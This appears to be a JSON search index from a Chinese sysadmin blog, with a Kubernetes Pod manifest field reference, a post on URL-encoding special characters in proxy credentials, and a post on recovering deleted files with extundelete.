\u003c/span\u003e\u003cspan class=\"c\"\u003e#Cpu的限制，单位为core数，将用于docker run --cpu-shares参数\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003ememory\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#内存限制，单位可以为Mib/Gib，将用于docker run --memory参数\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003erequests\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#资源请求的设置\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003ecpu\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring   \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#Cpu请求，容器启动的初始可用数量\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003ememory\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#内存请求,容器启动的初始可用数量\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003elifecycle\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#生命周期钩子\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003epostStart\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#容器启动后立即执行此钩子,如果执行失败,会根据重启策略进行重启\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003epreStop\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#容器终止前执行此钩子,无论结果如何,容器都会终止\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003elivenessProbe\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e#对Pod内各容器健康检查的设置，当探测无响应几次后将自动重启该容器\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eexec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e       　 \u003c/span\u003e\u003cspan class=\"c\"\u003e#对Pod容器内检查方式设置为exec方式\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003ecommand\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"l\"\u003estring] \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#exec方式需要制定的命令或脚本\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttpGet\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"c\"\u003e#对Pod内个容器健康检查方法设置为HttpGet，需要制定Path、port\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003enumber\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003ehost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003escheme\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eHttpHeaders\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003etcpSocket\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e     \u003c/span\u003e\u003cspan class=\"c\"\u003e#对Pod内个容器健康检查方式设置为tcpSocket方式\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e         \u003c/span\u003e\u003cspan class=\"nt\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003enumber\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"nt\"\u003einitialDelaySeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"c\"\u003e#容器启动完成后首次探测的时间，单位为秒\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"nt\"\u003etimeoutSeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\u003cspan class=\"w\"\u003e    　　    \u003c/span\u003e\u003cspan class=\"c\"\u003e#对容器健康检查探测等待响应的超时时间，单位秒，默认1秒\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"nt\"\u003eperiodSeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\u003cspan class=\"w\"\u003e     　　    \u003c/span\u003e\u003cspan class=\"c\"\u003e#对容器监控检查的定期探测时间设置，单位秒，默认10秒一次\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"nt\"\u003esuccessThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"nt\"\u003efailureThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"nt\"\u003esecurityContext\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e         \u003c/span\u003e\u003cspan class=\"nt\"\u003eprivileged\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003erestartPolicy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"l\"\u003eAlways | Never | OnFailure] \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#Pod的重启策略\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003enodeName\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e\u0026lt;string\u0026gt;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#设置NodeName表示将该Pod调度到指定到名称的node节点上\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003enodeSelector\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eobeject\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#设置NodeSelector表示将该Pod调度到包含这个label的node上\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eimagePullSecrets\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#Pull镜像时使用的secret名称，以key：secretkey格式指定\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ehostNetwork\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"c\"\u003e#是否使用主机网络模式，默认为false，如果设置为true，表示使用宿主机网络\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003evolumes\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"c\"\u003e#在该pod上定义共享存储卷列表\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring   \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#共享存储卷名称 （volumes类型有很多种）\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eemptyDir\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e{}\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"c\"\u003e#类型为emtyDir的存储卷，与Pod同生命周期的一个临时目录。为空值\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003ehostPath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring  \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#类型为hostPath的存储卷，表示挂载Pod所在宿主机的目录\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring      　　       \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#Pod所在宿主机的目录，将被用于同期中mount的目录\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003esecret\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e       　　　\u003c/span\u003e\u003cspan class=\"c\"\u003e#类型为secret的存储卷，挂载集群与定义的secret对象到容器内部\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003escretname\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring  \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e     \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e- \u003cspan class=\"nt\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003econfigMap\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e         \u003c/span\u003e\u003cspan class=\"c\"\u003e#类型为configMap的存储卷，挂载预定义的configMap对象到容器内部\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e- \u003cspan class=\"nt\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e在kubernetes中基本所有资源的一级属性都是一样的，主要包含5部分：\u003c/p\u003e","title":"kubernetes中Pod资源清单和解释"},{"content":"遇到个怪问题，设置http_proxy的时候有用户密码，命令如下：\nexport http_proxy=http://user\\2016:PmnQ 2016@192.168.0.1:3128 结果不生效，仔细观察上面的命令：\n用户名其实是：\u0026ldquo;user\\2016\u0026rdquo;，里面有个反斜杠\\\n而密码是：\u0026ldquo;PmnQ 2016\u0026rdquo;，里面有个空格\n这下麻烦了，命令过不去啊。\n反复搜索找到了字符转义表，第一个图是可以安全转义的：\n下面这张是不安全的：\n转一下吧： \\ 的16进制HEX是%5C，空格的16进制HEX是%20\n最后的语法：\nexport http_proxy=http://user%5C2016:PmnQ%202016@192.168.0.1:3128 搞定收工。\n","permalink":"https://rendoumi.com/posts/20240119-url_encode/","summary":"\u003cp\u003e遇到个怪问题，设置http_proxy的时候有用户密码，命令如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ehttp_proxy\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://user\u003cspan class=\"se\"\u003e\\2\u003c/span\u003e016:PmnQ 2016@192.168.0.1:3128  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e结果不生效，仔细观察上面的命令：\u003c/p\u003e\n\u003cp\u003e用户名其实是：\u0026ldquo;user\\2016\u0026rdquo;，里面有个反斜杠\\\u003c/p\u003e\n\u003cp\u003e而密码是：\u0026ldquo;PmnQ 2016\u0026rdquo;，里面有个空格\u003c/p\u003e\n\u003cp\u003e这下麻烦了，命令过不去啊。\u003c/p\u003e\n\u003cp\u003e反复搜索找到了字符转义表，第一个图是可以安全转义的：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240119131946433\" loading=\"lazy\" src=\"/posts/20240119-url_encode/image-20240119131946433.png\"\u003e\u003c/p\u003e\n\u003cp\u003e下面这张是不安全的：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240119132010631\" loading=\"lazy\" src=\"/posts/20240119-url_encode/image-20240119132010631.png\"\u003e\u003c/p\u003e\n\u003cp\u003e转一下吧： \\ 的16进制HEX是%5C，空格的16进制HEX是%20\u003c/p\u003e\n\u003cp\u003e最后的语法：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ehttp_proxy\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://user%5C2016:PmnQ%202016@192.168.0.1:3128  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e搞定收工。\u003c/p\u003e","title":"url中的字符转义"},{"content":"考古篇，记录下来，现在都是xfs了，但是方法不能忘啊！\n恢复过程如下：\n1、安装extundelete yum -y install e2fsprogs e2fsprogs-libs e2fsprogs-devel wget http://jaist.dl.sourceforge.net/project/extundelete/extundelete/0.2.4/extundelete-0.2.4.tar.bz2 tar -jxvf extundelete-0.2.4.tar.bz2 cd extundelete-0.2.4 ./configure make make install 2、卸载要恢复的分区 如果你误删除的分区是/dev/sda2,那么首先需要umount 这个分区的挂载点\n3、开始恢复 首先df -lh查看分区的使用情况，选择一个剩余空间足够容纳要恢复的文件大小的分区，例如你的/home分区剩余100G，你需要恢复的文件小于100G，那么你可以cd /home 然后进行恢复操作\ncd /home 恢复单个文件或文件夹\nextundelete /dev/mapper/vg_localhost-lv_home –restore-files 文件名 我是直接恢复整个分区\nextundelete /dev/mapper/vg_localhost-lv_home –restore-all 然后会在当前目录生成一个恢复文件夹，进去找你要的文件就可以了\n","permalink":"https://rendoumi.com/posts/20240119-extundelete/","summary":"\u003cp\u003e考古篇，记录下来，现在都是xfs了，但是方法不能忘啊！\u003c/p\u003e\n\u003cp\u003e恢复过程如下：\u003c/p\u003e\n\u003ch6 id=\"1安装extundelete\"\u003e1、安装extundelete\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install e2fsprogs e2fsprogs-libs e2fsprogs-devel  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://jaist.dl.sourceforge.net/project/extundelete/extundelete/0.2.4/extundelete-0.2.4.tar.bz2  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar -jxvf extundelete-0.2.4.tar.bz2  